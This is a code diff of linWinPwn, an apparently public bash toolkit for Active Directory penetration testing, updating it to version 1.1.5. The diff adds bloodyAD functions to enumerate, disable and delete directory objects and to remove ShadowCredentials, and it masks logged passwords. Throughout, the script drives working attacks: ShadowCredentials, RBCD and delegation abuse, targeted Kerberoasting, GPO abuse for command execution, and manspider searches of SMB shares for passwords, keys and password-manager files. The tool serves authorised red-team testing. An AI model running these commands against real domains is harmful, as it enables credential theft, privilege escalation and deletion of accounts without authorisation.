@@ -125,7 +125,6 @@ RunFinger="$scripts_dir/Responder/RunFinger.py"
 LDAPNightmare="$scripts_dir/CVE-2024-49113-checker.py"
 ADCheck=$(which adcheck)
 adPEAS=$(which adPEAS)
-breads=$(which breads-ad)
 smbclientng=$(which smbclientng)
 evilwinrm=$(which evil-winrm)
 ldapnomnom="$scripts_dir/ldapnomnom"
@@ -147,7 +146,7 @@ print_banner() {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 1.1.4 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 1.1.5 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -313,8 +312,8 @@ done
 set -- "${args[@]}"
 
 run_command() {
-    echo "$(date +%Y-%m-%d\ %H:%M:%S); $*" >>"$command_log"
-    echo -e "${YELLOW}[i]${NC} Running command: $*\n" > /dev/tty
+    echo "$(date +%Y-%m-%d\ %H:%M:%S); $*" | sed -e "s/$password$hash$aeskey/********/g" >>"$command_log"
+    echo -e "${YELLOW}[i]${NC} Running command: $*\n" | sed -e "s/$password$hash$aeskey/********/g" > /dev/tty
     /usr/bin/script -qc "$@" /dev/null
 }
 
@@ -1545,6 +1544,30 @@ bloodyad_dnsquery() {
     echo -e ""
 }
 
+bloodyad_enum_object() {
+    if [ ! -f "${bloodyad}" ]; then
+        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
+    else
+        mkdir -p "${DomainRecon_dir}/bloodyAD"
+        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
+            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
+        else
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
+            echo -e "${BLUE}[*] List details of object account. Please specify object to enumerate:${NC}"
+            echo -e "${CYAN}[*] Example: user01 or DC01$ or group01 ${NC}"
+            obj_enum=""
+            read -rp ">> " obj_enum </dev/tty
+            while [ "${obj_enum}" == "" ]; do
+                echo -e "${RED}Invalid name.${NC} Please specify object:"
+                read -rp ">> " obj_enum </dev/tty
+            done
+            echo -e "${CYAN}[*] Listing details of object ${obj_enum}${NC}"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get object '${obj_enum}'" 2>&1 | tee -a "${DomainRecon_dir}/bloodyAD/bloodyad_out_${obj_enum}_${dc_domain}.txt"
+        fi
+    fi
+    echo -e ""
+}
+
 silenthound_enum() {
     if [ ! -f "${silenthound}" ]; then
         echo -e "${RED}[-] Please verify the location of silenthound${NC}"
@@ -1806,26 +1829,6 @@ adpeas_enum() {
             cd "${DomainRecon_dir}/adPEAS" || exit
             run_command "${adPEAS} ${argument_adpeas} -i ${dc_ip}" 2>&1 | tee -a "${DomainRecon_dir}/adPEAS_output_${dc_domain}.txt"
             cd "${current_dir}" || exit
-        fi
-    fi
-    echo -e ""
-}
-
-breads_console() {
-    if [ ! -f "${breads}" ]; then
-        echo -e "${RED}[-] Please verify the installation of breads${NC}"
-    else
-        if [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
-            echo -e "${PURPLE}[-] breads does not support Kerberos authentication ${NC}"
-        else
-            echo -e "${BLUE}[*] Launching breads${NC}"
-            rm -rf "${HOME}/.breads/${user}_${dc_domain}" 2>/dev/null
-            echo "$(date +%Y-%m-%d\ %H:%M:%S); ${breads} | tee -a ${DomainRecon_dir}/breads_output_${dc_domain}.txt" >>"$command_log"
-            echo -e "${YELLOW}[i]${NC} Running command: ${breads}" > /dev/tty
-            (
-                echo -e "create_profile ${user}_${dc_domain}\nload_profile ${user}_${dc_domain}\n${dc_ip}\n${domain}\\\\${user}\n${password}${hash}\ncurrent_profile"
-                cat /dev/tty
-            ) | /usr/bin/script -qc "${breads}" /dev/null | tee -a "${DomainRecon_dir}/breads_output_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -2889,7 +2892,23 @@ finduncshar_scan() {
             ne_smb_scan
             if [ "${ldaps_bool}" == true ]; then ldaps_param="--ldaps"; else ldaps_param=""; fi
             if [ "${verbose_bool}" == true ]; then verbose_p0dalirius="-v --debug"; else verbose_p0dalirius=""; fi
-            run_command "${python3} ${FindUncommonShares} ${argument_FindUncom} ${verbose_p0dalirius} ${ldaps_param} -ai ${dc_ip} -tf ${servers_smb_list} --check-user-access --export-xlsx ${Shares_dir}/finduncshar_${user_var}.xlsx --kdcHost ${dc_FQDN}" 2>&1 | tee -a "${Shares_dir}/finduncshar_shares_output_${user_var}.txt"
+            run_command "${python3} ${FindUncommonShares} ${argument_FindUncom} ${verbose_p0dalirius} ${ldaps_param} -ai ${dc_ip} -tf ${servers_smb_list} --check-user-access --export-xlsx ${Shares_dir}/finduncshar_${user_var}.xlsx --kdcHost ${dc_FQDN} --no-ldap" 2>&1 | tee -a "${Shares_dir}/finduncshar_shares_output_${user_var}.txt"
+        fi
+    fi
+    echo -e ""
+}
+
+finduncshar_fullscan() {
+    if [ ! -f "${FindUncommonShares}" ]; then
+        echo -e "${RED}[-] Please verify the installation of FindUncommonShares${NC}"
+    else
+        echo -e "${BLUE}[*] Enumerating all Servers and Shares using FindUncommonShares${NC}"
+        if [ "${nullsess_bool}" == true ]; then
+            echo -e "${PURPLE}[-] FindUncommonShares requires credentials ${NC}"
+        else
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="--ldaps"; else ldaps_param=""; fi
+            if [ "${verbose_bool}" == true ]; then verbose_p0dalirius="-v --debug"; else verbose_p0dalirius=""; fi
+            run_command "${python3} ${FindUncommonShares} ${argument_FindUncom} ${verbose_p0dalirius} ${ldaps_param} -ai ${dc_ip} --check-user-access --export-xlsx ${Shares_dir}/finduncshar_${user_var}.xlsx --kdcHost ${dc_FQDN}" 2>&1 | tee -a "${Shares_dir}/finduncshar_shares_output_${user_var}.txt"
         fi
     fi
     echo -e ""
@@ -2904,17 +2923,17 @@ manspider_scan() {
         echo -e "${CYAN}[*] Running manspider....${NC}"
         ne_smb_scan
         echo -e "${CYAN}[*] Searching for files with interesting filenames${NC}"
-        run_command "${manspider} ${argument_manspider} ${servers_smb_list} -q -t 10 -f passw user admin account network login key logon cred -l ${Shares_dir}/manspiderDump_${user_var}" 2>&1 | tee -a "${Shares_dir}/manspider_output_${dc_domain}.txt"
-        echo -e "${CYAN}[*] Searching for SSH keys${NC}"
-        run_command "${manspider} ${argument_manspider} ${servers_smb_list} -q -t 10 -e ppk rsa pem ssh rsa -o -f id_rsa id_dsa id_ed25519 -l ${Shares_dir}/manspiderDump_${user_var}" 2>&1 | tee -a "${Shares_dir}/manspider_output_${dc_domain}.txt"
+        run_command "${manspider} ${argument_manspider} ${servers_smb_list} -q -t 10 -f passw user admin account network login key logon cred -l ${Shares_dir}/manspiderDump_${user_var}" 2>&1 | tee -a "${Shares_dir}/manspider_output_${user_var}.txt"
+        #echo -e "${CYAN}[*] Searching for SSH keys${NC}"
+        #run_command "${manspider} ${argument_manspider} ${servers_smb_list} -q -t 10 -e ppk rsa pem ssh rsa -o -f id_rsa id_dsa id_ed25519 -l ${Shares_dir}/manspiderDump_${user_var}" 2>&1 | tee -a "${Shares_dir}/manspider_output_${user_var}.txt"
         echo -e "${CYAN}[*] Searching for files with interesting extensions${NC}"
-        run_command "${manspider} ${argument_manspider} ${servers_smb_list} -q -t 10 -e bat com vbs ps1 psd1 psm1 pem key rsa pub reg txt cfg conf config xml cspkg publishsettings json cnf sql cmd -l ${Shares_dir}/manspiderDump_${user_var}" 2>&1 | tee -a "${Shares_dir}/manspider_output_${dc_domain}.txt"
+        run_command "${manspider} ${argument_manspider} ${servers_smb_list} -q -t 10 -e bat com vbs ps1 psd1 psm1 pem key rsa pub reg txt cfg conf config xml cspkg publishsettings json cnf sql cmd -l ${Shares_dir}/manspiderDump_${user_var}" 2>&1 | tee -a "${Shares_dir}/manspider_output_${user_var}.txt"
         echo -e "${CYAN}[*] Searching for Password manager files${NC}"
-        run_command "${manspider} ${argument_manspider} ${servers_smb_list} -q -t 10 -e kdbx kdb 1pif agilekeychain opvault lpd dashlane psafe3 enpass bwdb msecure stickypass pwm rdb safe zps pmvault mywallet jpass pwmdb -l ${Shares_dir}/manspiderDump_${user_var}" 2>&1 | tee -a "${Shares_dir}/manspider_output_${dc_domain}.txt"
+        run_command "${manspider} ${argument_manspider} ${servers_smb_list} -q -t 10 -e kdbx kdb 1pif agilekeychain opvault lpd dashlane psafe3 enpass bwdb msecure stickypass pwm rdb safe zps pmvault mywallet jpass pwmdb -l ${Shares_dir}/manspiderDump_${user_var}" 2>&1 | tee -a "${Shares_dir}/manspider_output_${user_var}.txt"
         echo -e "${CYAN}[*] Searching for word passw in documents${NC}"
-        run_command "${manspider} ${argument_manspider} ${servers_smb_list} -q -t 10 -c passw login -e docx xlsx xls pdf pptx csv -l ${Shares_dir}/manspiderDump_${user_var}" 2>&1 | tee -a "${Shares_dir}/manspider_output_${dc_domain}.txt"
-        echo -e "${CYAN}[*] Searching for words in downloaded files${NC}"
-        run_command "${manspider} ${Shares_dir}/manspiderDump_${user_var} -q -t 100 -c passw key login -l ${Shares_dir}/manspiderDump_${user_var}" 2>&1 | tee -a "${Shares_dir}/manspider_output_${user_var}.txt"
+        run_command "${manspider} ${argument_manspider} ${servers_smb_list} -q -t 10 -c passw login -e docx xlsx xls pdf pptx csv -l ${Shares_dir}/manspiderDump_${user_var}" 2>&1 | tee -a "${Shares_dir}/manspider_output_${user_var}.txt"
+        #echo -e "${CYAN}[*] Searching for words in downloaded files${NC}"
+        #run_command "${manspider} ${Shares_dir}/manspiderDump_${user_var} -q -t 100 -c passw key login -l ${Shares_dir}/manspiderDump_${user_var}" 2>&1 | tee -a "${Shares_dir}/manspider_output_${user_var}.txt"
         echo -e ""
     fi
 }
@@ -3130,7 +3149,7 @@ ldapnightmare_check() {
 
 badsuccessor_check() {
     echo -e "${BLUE}[*] Running BadSuccessor check against domain${NC}"
-    run_command "${netexec} ${ne_verbose} ldap ${target_dc} ${argument_ne} -M badsuccessor --log ${Vulnerabilities_dir}/ne_badsuccessor_output_${dc_domain}.txt" 2>&1
+    run_command "${netexec} ${ne_verbose} ldap ${target} ${argument_ne} -M badsuccessor --log ${Vulnerabilities_dir}/ne_badsuccessor_output_${dc_domain}.txt" 2>&1
     echo -e ""
 }
 
@@ -3184,7 +3203,14 @@ mssql_relay_check() {
             echo -e "${BLUE}[*] MSSQL Relay Check${NC}"
             if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-scheme ldap"; fi
             if [ "${dnstcp_bool}" == true ]; then dnstcp_param="-dns-tcp "; else dnstcp_param=""; fi
-            run_command "${mssqlrelay} ${mssqlrelay_verbose} checkall ${ldaps_param} ${dnstcp_param} ${argument_mssqlrelay} -ns ${dc_ip} -windows-auth" | tee "${MSSQL_dir}/mssql_relay_output_${user_var}.txt" 2>&1
+            run_command "${mssqlrelay} ${mssqlrelay_verbose} checkall ${ldaps_param} ${dnstcp_param} ${argument_mssqlrelay} -ns ${dc_ip} -windows-auth" | tee "${MSSQL_dir}/mssql_relay_checkall_output_${user_var}.txt" 2>&1
+            sql_mssqlrelay="${MSSQL_dir}/mssql_relay_instances_${user_var}.txt"
+            grep -i "MSSQLSvc" "${MSSQL_dir}/mssql_relay_checkall_output_${user_var}.txt" 2>/dev/null| awk -F'[/:)]+' '$3 ~ /^[0-9]+$/ {print $2 " -mssql-port " $3}' | sort -u >> "${sql_mssqlrelay}"
+            if [ -f "${sql_mssqlrelay}" ]; then
+                for i in $(/bin/cat "${sql_mssqlrelay}"); do
+                    echo "${mssqlrelay} ${mssqlrelay_verbose} check ${ldaps_param} ${dnstcp_param} ${argument_mssqlrelay} -ns ${dc_ip} -windows-auth -target $i" > "${MSSQL_dir}/mssql_relay_check_run_${user_var}.sh" 2>&1
+                done
+            fi
         fi
     fi
     echo -e ""
@@ -3373,6 +3399,30 @@ enable_account() {
     echo -e ""
 }
 
+disable_account() {
+    if [ ! -f "${bloodyad}" ]; then
+        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
+    else
+        mkdir -p "${Modification_dir}/bloodyAD_${user_var}"
+        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
+            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
+        else
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
+            echo -e "${BLUE}[*] Please specify account to disable:${NC}"
+            echo -e "${CYAN}[*] Example: svc_sql ${NC}"
+            account_disable=""
+            read -rp ">> " account_disable </dev/tty
+            while [ "${account_disable}" == "" ]; do
+                echo -e "${RED}Invalid name.${NC} Please specify target account:"
+                read -rp ">> " account_disable </dev/tty
+            done
+            echo -e "${BLUE}[*] Disabling account ${account_disable}${NC}"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} -f rc4 add uac ${account_disable} -f ACCOUNTDISABLE" | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_disable_${dc_domain}.txt"
+        fi
+    fi
+    echo -e ""
+}
+
 change_owner() {
     if [ ! -f "${bloodyad}" ]; then
         echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
@@ -3416,6 +3466,30 @@ add_genericall() {
             done
             echo -e "${CYAN}[*] Adding GenericAll rights on ${target_genericall} to ${user}${NC}"
             run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add genericAll ${target_genericall} '${user}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_genericall_${dc_domain}.txt"
+        fi
+    fi
+    echo -e ""
+}
+
+delete_object() {
+    if [ ! -f "${bloodyad}" ]; then
+        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
+    else
+        mkdir -p "${Modification_dir}/bloodyAD_${user_var}"
+        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
+            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
+        else
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
+            echo -e "${BLUE}[*] Deleting object account. Please specify object to remove:${NC}"
+            echo -e "${CYAN}[*] Example: user01 or DC01$ or group01 ${NC}"
+            obj_delete=""
+            read -rp ">> " obj_delete </dev/tty
+            while [ "${obj_delete}" == "" ]; do
+                echo -e "${RED}Invalid name.${NC} Please specify object:"
+                read -rp ">> " obj_delete </dev/tty
+            done
+            echo -e "${CYAN}[*] Deleting object ${obj_delete}${NC}"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} remove object '${obj_delete}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_delobj_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -3579,6 +3653,38 @@ shadowcreds_attack() {
             done
             echo -e "${CYAN}[*] Performing ShadowCredentials attack against ${target_shadowcreds}${NC}"
             run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add shadowCredentials '${target_shadowcreds}' --path ${Credentials_dir}/shadowcreds_${user_var}_${target_shadowcreds}" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_shadowcreds_${dc_domain}.txt"
+        fi
+    fi
+    echo -e ""
+}
+
+shadowcreds_delete() {
+    if [ ! -f "${bloodyad}" ]; then
+        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
+    else
+        mkdir -p "${Modification_dir}/bloodyAD_${user_var}"
+        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
+            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
+        else
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
+            echo -e "${BLUE}[*] Removing added ShadowCredentials from target. Please specify target:${NC}"
+            echo -e "${CYAN}[*] Example: user01 or DC01$ ${NC}"
+            target_shadowcreds=""
+            read -rp ">> " target_shadowcreds </dev/tty
+            while [ "${target_shadowcreds}" == "" ]; do
+                echo -e "${RED}Invalid name.${NC} Please specify target:"
+                read -rp ">> " target_shadowcreds </dev/tty
+            done
+            key_shadowcreds=""
+            echo -e "${CYAN}[*] Please specify Key Credentials to remove (default: all Keys) ${NC}"
+            read -rp ">> " key_shadowcreds </dev/tty
+            if [ ! "${key_shadowcreds}" == "" ]; then
+                key_param_shadowcreds="--key ${key_shadowcreds}"
+            else
+                key_param_shadowcreds=""
+            fi
+            echo -e "${CYAN}[*] Removing Key Credentials from ${target_shadowcreds}${NC}"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} remove shadowCredentials ${key_param_shadowcreds} '${target_shadowcreds}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_shadowcreds_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -4331,7 +4437,7 @@ modify_target() {
         custom_servers=""
         custom_ip=""
         /bin/rm "${custom_servers_list}" 2>/dev/null
-        /bin/rm "${Scans_dir}"/servers_custom_*_"${dc_domain}.txt"
+        /bin/rm "${Scans_dir}"/servers_custom_*_"${dc_domain}.txt" 2>/dev/null
         read -rp ">> " custom_servers </dev/tty
         /bin/cp "$custom_servers" "${custom_servers_list}" 2>/dev/null
         while [ ! -s "${custom_servers_list}" ]; do
@@ -4346,7 +4452,7 @@ modify_target() {
         custom_servers=""
         custom_ip=""
         /bin/rm "${custom_servers_list}" 2>/dev/null
-        /bin/rm "${Scans_dir}"/servers_custom_*_"${dc_domain}.txt"
+        /bin/rm "${Scans_dir}"/servers_custom_*_"${dc_domain}.txt" 2>/dev/null
         read -rp ">> " custom_ip </dev/tty
         echo -n "$custom_ip" >"${custom_servers_list}" 2>/dev/null
         while [ ! -s "${custom_servers_list}" ]; do
@@ -4439,19 +4545,19 @@ ad_menu() {
     echo -e "11) bloodyAD All Enumeration"
     echo -e "12) bloodyAD write rights Enumeration"
     echo -e "13) bloodyAD query DNS server"
-    echo -e "14) SilentHound LDAP Enumeration"
-    echo -e "15) ldeep LDAP Enumeration"
-    echo -e "16) windapsearch LDAP Enumeration"
-    echo -e "17) LDAP Wordlist Harvester"
-    echo -e "18) LDAP Enumeration using LDAPPER"
-    echo -e "19) Adalanche Enumeration"
-    echo -e "20) GPO Enumeration using GPOwned"
-    echo -e "21) Enumeration of RDWA servers"
-    echo -e "22) Open p0dalirius' LDAP Console"
-    echo -e "23) Open p0dalirius' LDAP Monitor"
-    echo -e "24) Open garrettfoster13's ACED console"
-    echo -e "25) Open LDAPPER custom options"
-    echo -e "26) Open breads console"
+    echo -e "14) bloodyAD enumerate object"
+    echo -e "15) SilentHound LDAP Enumeration"
+    echo -e "16) ldeep LDAP Enumeration"
+    echo -e "17) windapsearch LDAP Enumeration"
+    echo -e "18) LDAP Wordlist Harvester"
+    echo -e "19) LDAP Enumeration using LDAPPER"
+    echo -e "20) Adalanche Enumeration"
+    echo -e "21) GPO Enumeration using GPOwned"
+    echo -e "22) Enumeration of RDWA servers"
+    echo -e "23) Open p0dalirius' LDAP Console"
+    echo -e "24) Open p0dalirius' LDAP Monitor"
+    echo -e "25) Open garrettfoster13's ACED console"
+    echo -e "26) Open LDAPPER custom options"
     echo -e "27) Run godap console"
     echo -e "28) Run adPEAS enumerations"
     echo -e "29) Run ADCheck enumerations"
@@ -4543,67 +4649,67 @@ ad_menu() {
         ;;
 
     14)
-        silenthound_enum
+        bloodyad_enum_object
         ad_menu
         ;;
 
     15)
-        ldeep_enum
+        silenthound_enum
         ad_menu
         ;;
 
     16)
-        windapsearch_enum
+        ldeep_enum
         ad_menu
         ;;
 
     17)
-        ldapwordharv_enum
+        windapsearch_enum
         ad_menu
         ;;
 
     18)
-        ldapper_enum
+        ldapwordharv_enum
         ad_menu
         ;;
 
     19)
-        adalanche_enum
+        ldapper_enum
         ad_menu
         ;;
 
     20)
-        GPOwned_enum
+        adalanche_enum
         ad_menu
         ;;
 
     21)
-        rdwatool_enum
+        GPOwned_enum
         ad_menu
         ;;
 
     22)
-        ldap_console
+        rdwatool_enum
         ad_menu
         ;;
 
     23)
-        ldap_monitor
+        ldap_console
         ad_menu
         ;;
 
     24)
-        aced_console
+        ldap_monitor
         ad_menu
         ;;
 
     25)
-        ldapper_console
+        aced_console
         ad_menu
         ;;
 
     26)
-        breads_console
+        ldapper_console
         ad_menu
         ;;
 
@@ -5400,9 +5506,10 @@ shares_menu() {
     echo -e "2) SMB shares Enumeration using netexec"
     echo -e "3) SMB shares Spidering using netexec "
     echo -e "4) SMB shares Scan using FindUncommonShares"
-    echo -e "5) SMB shares Scan using manspider"
-    echo -e "6) Open smbclient.py console on target"
-    echo -e "7) Open p0dalirius's smbclientng console on target"
+    echo -e "5) List all servers and run SMB shares Scan using FindUncommonShares"
+    echo -e "6) SMB shares Scan using manspider"
+    echo -e "7) Open smbclient.py console on target"
+    echo -e "8) Open p0dalirius's smbclientng console on target"
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
@@ -5440,16 +5547,21 @@ shares_menu() {
         ;;
 
     5)
-        manspider_scan
+        finduncshar_fullscan
         shares_menu
         ;;
 
     6)
-        smbclient_console
+        manspider_scan
         shares_menu
         ;;
 
     7)
+        smbclient_console
+        shares_menu
+        ;;
+
+    8)
         smbclientng_console
         shares_menu
         ;;
@@ -5832,18 +5944,21 @@ modif_menu() {
     echo -e "3) Add new computer (Requires: MAQ > 0)"
     echo -e "4) Add new DNS entry"
     echo -e "5) Enable account"
-    echo -e "6) Change Owner of target (Requires: WriteOwner permission)"
-    echo -e "7) Add GenericAll rights on target (Requires: Owner permission)"
-    echo -e "8) Targeted Kerberoast Attack (Noisy!)"
-    echo -e "9) Perform RBCD attack (Requires: GenericWrite or GenericAll or AllowedToAct on computer)"
-    echo -e "10) Perform RBCD attack on SPN-less user (Requires: GenericWrite or GenericAll or AllowedToAct on computer & MAQ=0)"
-    echo -e "11) Perform ShadowCredentials attack (Requires: AddKeyCredentialLink)"
-    echo -e "12) Abuse GPO to execute command (Requires: GenericWrite or GenericAll on GPO)"
-    echo -e "13) Add Unconstrained Delegation rights - uac: TRUSTED_FOR_DELEGATION (Requires: SeEnableDelegationPrivilege rights)"
-    echo -e "14) Add CIFS and HTTP SPNs entries to computer with Unconstrained Deleg rights - ServicePrincipalName & msDS-AdditionalDnsHostName (Requires: Owner of computer)"
-    echo -e "15) Add userPrincipalName to perform Kerberos impersonation of another user (Requires: GenericWrite or GenericAll on user)"
-    echo -e "16) Add Constrained Delegation rights - uac: TRUSTED_TO_AUTH_FOR_DELEGATION (Requires: SeEnableDelegationPrivilege rights)"
-    echo -e "17) Add HOST and LDAP SPN entries of DC to computer with Constrained Deleg rights - msDS-AllowedToDelegateTo (Requires: Owner of computer)"
+    echo -e "6) Disable account"
+    echo -e "7) Change Owner of target (Requires: WriteOwner permission)"
+    echo -e "8) Add GenericAll rights on target (Requires: Owner permission)"
+    echo -e "9) Delete object (Requires: GenericWrite or GenericAll on object)"
+    echo -e "10) Targeted Kerberoast Attack (Noisy!)"
+    echo -e "11) Perform RBCD attack (Requires: GenericWrite or GenericAll or AllowedToAct on computer)"
+    echo -e "12) Perform RBCD attack on SPN-less user (Requires: GenericWrite or GenericAll or AllowedToAct on computer & MAQ=0)"
+    echo -e "13) Perform ShadowCredentials attack (Requires: AddKeyCredentialLink)"
+    echo -e "14) Remove added ShadowCredentials (Requires: AddKeyCredentialLink)"
+    echo -e "15) Abuse GPO to execute command (Requires: GenericWrite or GenericAll on GPO)"
+    echo -e "16) Add Unconstrained Delegation rights - uac: TRUSTED_FOR_DELEGATION (Requires: SeEnableDelegationPrivilege rights)"
+    echo -e "17) Add CIFS and HTTP SPNs entries to computer with Unconstrained Deleg rights - ServicePrincipalName & msDS-AdditionalDnsHostName (Requires: Owner of computer)"
+    echo -e "18) Add userPrincipalName to perform Kerberos impersonation of another user (Requires: GenericWrite or GenericAll on user)"
+    echo -e "19) Add Constrained Delegation rights - uac: TRUSTED_TO_AUTH_FOR_DELEGATION (Requires: SeEnableDelegationPrivilege rights)"
+    echo -e "20) Add HOST and LDAP SPN entries of DC to computer with Constrained Deleg rights - msDS-AllowedToDelegateTo (Requires: Owner of computer)"
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
@@ -5876,61 +5991,76 @@ modif_menu() {
         ;;
 
     6)
-        change_owner
+        disable_account
         modif_menu
         ;;
 
     7)
-        add_genericall
+        change_owner
         modif_menu
         ;;
 
     8)
-        targetedkerberoast_attack
+        add_genericall
         modif_menu
         ;;
 
     9)
-        rbcd_attack
+        delete_object
         modif_menu
         ;;
 
     10)
-        rbcd_spnless_attack
+        targetedkerberoast_attack
         modif_menu
         ;;
 
     11)
-        shadowcreds_attack
+        rbcd_attack
         modif_menu
         ;;
 
     12)
-        pygpo_abuse
+        rbcd_spnless_attack
         modif_menu
         ;;
 
     13)
-        add_unconstrained
+        shadowcreds_attack
         modif_menu
         ;;
 
     14)
-        add_spn
+        shadowcreds_delete
         modif_menu
         ;;
 
     15)
-        add_upn
+        pygpo_abuse
         modif_menu
         ;;
 
     16)
-        add_constrained
+        add_unconstrained
         modif_menu
         ;;
 
     17)
+        add_spn
+        modif_menu
+        ;;
+
+    18)
+        add_upn
+        modif_menu
+        ;;
+
+    19)
+        add_constrained
+        modif_menu
+        ;;
+
+    20)
         add_spn_constrained
         modif_menu
         ;;
@@ -6380,7 +6510,6 @@ config_menu() {
         if [ ! -f "${LDAPNightmare}" ]; then echo -e "${RED}[-] LDAPNightmare is not installed${NC}"; else echo -e "${GREEN}[+] LDAPNightmare is installed${NC}"; fi
         if [ ! -x "${LDAPNightmare}" ]; then echo -e "${RED}[-] LDAPNightmare is not executable${NC}"; else echo -e "${GREEN}[+] LDAPNightmare is executable${NC}"; fi
         if [ ! -f "${adPEAS}" ]; then echo -e "${RED}[-] adPEAS is not installed${NC}"; else echo -e "${GREEN}[+] adPEAS is installed${NC}"; fi
-        if [ ! -f "${breads}" ]; then echo -e "${RED}[-] breads is not installed${NC}"; else echo -e "${GREEN}[+] breads is installed${NC}"; fi
         if [ ! -f "${ADCheck}" ]; then echo -e "${RED}[-] ADCheck is not installed${NC}"; else echo -e "${GREEN}[+] ADCheck is installed${NC}"; fi
         if [ ! -f "${smbclientng}" ]; then echo -e "${RED}[-] smbclientng is not installed${NC}"; else echo -e "${GREEN}[+] smbclientng is installed${NC}"; fi
         if [ ! -f "${ldapnomnom}" ]; then echo -e "${RED}[-] ldapnomnom is not installed${NC}"; else echo -e "${GREEN}[+] ldapnomnom is installed${NC}"; fi
